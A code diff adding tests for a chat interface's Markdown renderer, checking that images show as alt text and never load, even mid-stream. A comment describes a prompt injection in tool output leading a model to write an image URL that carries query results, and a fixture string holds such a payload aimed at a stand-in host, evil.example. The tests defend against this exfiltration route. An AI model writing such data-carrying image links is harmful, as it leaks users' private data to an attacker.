@@ -23,6 +23,38 @@ describe("Markdown", () => {
   });
 });
 
+// Loading an image is a request the reader never chose to make. A prompt
+// injection in tool output could get the model to write an image whose URL
+// carries query results, and the browser would deliver them on render.
+const EXFIL = "Done. ![chart](https://evil.example/c.png?d=alice%2C42) Next.";
+
+describe("Markdown images", () => {
+  it("shows an image's alt text without loading it", () => {
+    const { container } = render(<Markdown>{EXFIL}</Markdown>);
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("[image: chart]")).toBeInTheDocument();
+  });
+
+  it("keeps a linked image to one link", () => {
+    const { container } = render(
+      <Markdown>{`[![logo](https://evil.example/l.png)](https://example.com)`}</Markdown>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("a a")).toBeNull();
+    expect(screen.getByRole("link")).toHaveTextContent("[image: logo]");
+  });
+
+  it("never loads an image at any point of a stream", () => {
+    for (let end = 1; end <= EXFIL.length; end++) {
+      const { container, unmount } = render(
+        <Markdown streaming>{EXFIL.slice(0, end)}</Markdown>,
+      );
+      expect(container.querySelector("img"), `frame ${end}`).toBeNull();
+      unmount();
+    }
+  });
+});
+
 // A reply arriving token by token is re-parsed in full on every frame, so an
 // unfinished construct used to render as whatever it currently looked like:
 // table header cells as literal pipes in the sentence above them, a bare fence
